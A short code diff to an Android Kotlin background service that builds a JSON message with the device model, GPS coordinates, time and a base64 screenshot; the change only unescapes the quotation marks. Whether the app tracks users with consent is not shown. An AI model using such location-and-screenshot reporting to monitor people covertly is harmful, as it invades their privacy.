@@ -123,12 +123,12 @@ class GpsLocationService : Service() {
                 if (location != null) {
                     val message = """
                         {
-                          \"type\": \"location_response\",
-                          \"device\": \"${Build.MODEL}\",
-                          \"latitude\": ${location.latitude},
-                          \"longitude\": ${location.longitude},
-                          \"time\": \"${LocalTime.now()}\",
-                          \"screenshot\": \"$screenshotBase64\"
+                          "type": "location_response",
+                          "device": "${Build.MODEL}",
+                          "latitude": ${location.latitude},
+                          "longitude": ${location.longitude},
+                          "time": "${LocalTime.now()}",
+                          "screenshot": "$screenshotBase64"
                         }
                     """.trimIndent()
                     Log.d("SERVICE", "Sending: $message")
